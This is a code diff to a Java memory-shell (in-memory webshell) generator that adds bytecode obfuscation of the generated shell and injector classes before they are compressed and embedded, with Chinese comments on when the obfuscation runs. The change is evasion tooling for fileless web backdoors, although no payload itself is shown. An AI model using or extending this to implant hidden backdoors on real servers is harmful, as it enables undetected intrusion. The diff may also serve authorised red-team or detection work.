@@ -6,6 +6,9 @@ import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.memshell.generator.InjectorGenerator;
+import com.reajason.javaweb.memshell.obfuscation.ClassObfuscation;
+import com.reajason.javaweb.memshell.obfuscation.ObfuscationInfo;
+import com.reajason.javaweb.memshell.obfuscation.ObfuscationTarget;
 import com.reajason.javaweb.memshell.server.AbstractServer;
 import com.reajason.javaweb.memshell.spi.ShellToolProvider;
 import com.reajason.javaweb.probe.ProbeContent;
@@ -107,6 +110,19 @@ public class MemShellGenerator {
         byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);
         shellBytes = server.postProcessShellBytes(shellBytes, shellConfig, shellToolConfig, injectorConfig);
 
+        // 混淆时序 1：必须在 postProcessShellBytes 改写完成之后、注入器 gzip+base64 嵌入之前
+        ObfuscationInfo obfuscationInfo = null;
+        if (shellConfig.isObfuscationEnabled()) {
+            obfuscationInfo = ObfuscationInfo.builder().enabled(true).build();
+            obfuscationInfo.setOriginalShellSize(shellBytes.length);
+            shellBytes = ClassObfuscation.obfuscate(
+                    shellBytes, shellToolConfig.getShellClassName(),
+                    shellConfig.getTargetJreVersion(), ObfuscationTarget.SHELL, shellConfig.getObfuscation(),
+                    server.getShellMethodContracts(shellConfig.getShellType()),
+                    Collections.<String, byte[]>emptyMap(), true);
+            obfuscationInfo.setObfuscatedShellSize(shellBytes.length);
+        }
+
         injectorConfig.setInjectorTemplateClassName(injectorTemplateClassName);
         injectorConfig.setInjectorTemplateClassLoader(server.getClass().getClassLoader());
         injectorConfig.setShellClassName(shellToolConfig.getShellClassName());
@@ -114,6 +130,27 @@ public class MemShellGenerator {
 
         InjectorGenerator injectorGenerator = new InjectorGenerator(shellConfig, injectorConfig);
         byte[] injectorBytes = injectorGenerator.generate();
+        Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();
+
+        // 混淆时序 2：InjectorGenerator 生成完整字节码之后；probe 模式下混淆作用于内嵌 injector，
+        // 外层回显 Wrapper 保持轻量原样。inner/helper 作为 relatedClasses 触发跨类引用保护。
+        if (shellConfig.isObfuscationEnabled()) {
+            obfuscationInfo.setOriginalInjectorSize(injectorBytes.length);
+            Map<String, byte[]> relatedClasses = new LinkedHashMap<String, byte[]>(innerClassBytes);
+            byte[] helperClassBytes = injectorConfig.getHelperClassBytes();
+            if (helperClassBytes != null) {
+                relatedClasses.put("helper", helperClassBytes);
+            }
+            // 可嵌入体积校验只针对真正会被 gzip+base64 嵌入回显 Wrapper 的产物，
+            // 与下方 Wrapper 包装条件保持一致（Agent 类型不走 Wrapper，不做该校验）
+            injectorBytes = ClassObfuscation.obfuscate(
+                    injectorBytes, injectorConfig.getInjectorClassName(),
+                    shellConfig.getTargetJreVersion(), ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
+                    server.getInjectorMethodContracts(shellConfig.getShellType()), relatedClasses,
+                    shellConfig.isProbe() && !shellConfig.getShellType().startsWith(ShellType.AGENT));
+            obfuscationInfo.setObfuscatedInjectorSize(injectorBytes.length);
+        }
+
         if (shellConfig.isProbe() && !shellConfig.getShellType().startsWith(ShellType.AGENT)) {
             ProbeConfig probeConfig = ProbeConfig.builder()
                     .shellClassName(injectorConfig.getInjectorClassName() + "Wrapper")
@@ -133,8 +170,6 @@ public class MemShellGenerator {
             injectorConfig.setInjectorClassName(probeConfig.getShellClassName());
         }
 
-        Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();
-
         return MemShellResult.builder()
                 .shellConfig(shellConfig)
                 .shellToolConfig(shellToolConfig)
@@ -144,6 +179,7 @@ public class MemShellGenerator {
                 .injectorClassName(injectorConfig.getInjectorClassName())
                 .injectorBytes(injectorBytes)
                 .injectorInnerClassBytes(innerClassBytes)
+                .obfuscationInfo(obfuscationInfo)
                 .build();
     }
 
